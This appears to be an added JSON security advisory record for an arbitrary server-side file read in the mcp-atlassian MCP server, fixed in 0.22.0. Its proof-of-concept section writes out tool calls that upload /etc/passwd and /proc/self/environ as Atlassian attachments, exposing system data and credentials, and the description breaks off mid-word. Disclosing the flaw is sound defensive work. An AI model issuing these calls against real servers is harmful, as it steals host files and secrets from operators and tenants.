@@ -1,0 +1,54 @@
+{
+  "schema_version": "0.1.0",
+  "id": "AGT-2026-0188",
+  "modified": "2026-09-18T11:56:01.812172705Z",
+  "published": "2026-07-10T19:34:30Z",
+  "aliases": [
+    "GHSA-wm45-qh3g-v83f",
+    "CVE-2026-73496"
+  ],
+  "summary": "mcp-atlassian: Arbitrary server-side file read via attachment upload",
+  "details": "### Summary\n\nA client that can invoke MCP tools can read **arbitrary files from the server host** and exfiltrate them as Atlassian attachments. The attachment-upload tools take a client-supplied `file_path` and `open()` it on the **server's** filesystem.\n\nThe upload tools are meant to attach a file from the **caller's** environment — the client supplies a path expecting it to refer to its own machine. Over a remote transport (HTTP/SSE) that path is instead resolved and read on the server, and the tool offers no way for the client to send file *content* in place of a server-side path. A remote client therefore reads the server's files — and, in multi-tenant deployments, other tenants' data — instead of its own. (In a local `stdio` deployment the server runs as the user, so the path refers to the user's own files and reading any path is the intended behavior; the exposure is specific to remote/multi-user transports.)\n\n### Details\n\nThe upload tools read a client-supplied path directly on the server:\n\n- `src/mcp_atlassian/confluence/attachments.py` — `upload_attachment` → `_upload_attachment_direct` → `os.path.abspath(file_path)` → `open(file_path, \"rb\")`\n- `src/mcp_atlassian/jira/attachments.py` — `upload_attachment` → `os.path.abspath(file_path)` → `open(file_path, \"rb\")`\n\n`os.path.abspath()` only normalizes the path; the file is then opened on the server wherever it points and its bytes are sent to Atlassian as an attachment. There is no path a client can use to reference its own filesystem, and no option to upload raw content instead of a server-side path.\n\nClient-reachable entry points that hit these sinks:\n\n- `confluence_upload_attachment` → `ConfluenceFetcher.upload_attachment`. The `file_path` field is documented as \"absolute … or relative to the current working directory.\"\n- `confluence_upload_attachments` → loops over the same sink.\n- `jira_update_issue` — its `attachments` parameter (JSON array or comma-separated list of paths) flows through `IssuesMixin.update_issue` → `self.upload_attachments` → the Jira sink. There is no standalone `jira_upload_attachment` tool; `jira_update_issue` is the only Jira entry point.\n\n### PoC\n\n**Local reproduction**\n\nExtract `traversal_upload_attachment_file_read.zip`:\n```\n# Fill credentials in docker-compose.yml; set CONFLUENCE_PAGE_ID / JIRA_ISSUE_KEY in poc.sh\ndocker compose up -d        # mcp-atlassian, streamable-http, 0.0.0.0, READ_ONLY_MODE=false\n./poc.sh                    # exits 0 on success\n```\n\n> Requires Docker, curl, jq, and an Atlassian Cloud site with a Confluence page and a Jira issue (free tier works). The script runs the steps below and confirms the `/etc/passwd` round-trip. Planted attachments are intentionally left in place so they can be confirmed in the Atlassian UI.\n\nAll calls are issued against the HTTP transport with `READ_ONLY_MODE=false` (the default).\n\nStep 1 — read `/etc/passwd` from the server via Confluence upload:\n```\nreq → tools/call confluence_upload_attachment\n      { \"content_id\": \"<PAGE_ID>\", \"file_path\": \"/etc/passwd\" }\n← { \"message\": \"Attachment uploaded successfully\",\n    \"attachment\": { \"success\": true, \"filename\": \"passwd\", \"id\": \"att<...>\" } }\n```\n\nStep 2 — retrieve the exfiltrated content back through MCP (round-trip proves a real read):\n```\nreq → tools/call confluence_download_attachment { \"attachment_id\": \"att<...>\" }\n← base64 resource decoding to:\n    root:x:0:0:root:/root:/bin/bash\n    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n    ...\n```\n\nStep 3 — same primitive via the Jira entry point (second sink):\n```\nreq → tools/call jira_update_issue\n      { \"issue_key\": \"<ISSUE_KEY>\", \"fields\": \"{}\", \"attachments\": \"/etc/passwd\" }\n← { \"attachment_results\": { ... \"success\": true ... } }\n```\n\nStep 4 — credential disclosure via `/proc/self/environ`:\n```\nreq → tools/call confluence_upload_attachment\n      { \"content_id\": \"<PAGE_ID>\", \"file_path\": \"/proc/self/environ\" }\n← success; the resulting \"environ\" attachment contains the server's env,\n  inclu\n\nImported from OSV GHSA-wm45-qh3g-v83f.",
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://osv.dev/vulnerability/GHSA-wm45-qh3g-v83f"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/sooperset/mcp-atlassian/security/advisories/GHSA-wm45-qh3g-v83f"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/sooperset/mcp-atlassian"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "mcp-atlassian"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.22.0"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "database_specific": {
+    "artifact_type": "mcp_server",
+    "classification": "vulnerable",
+    "verification": "verified",
+    "reporter": "osv-import",
+    "severity": "high"
+  }
+}
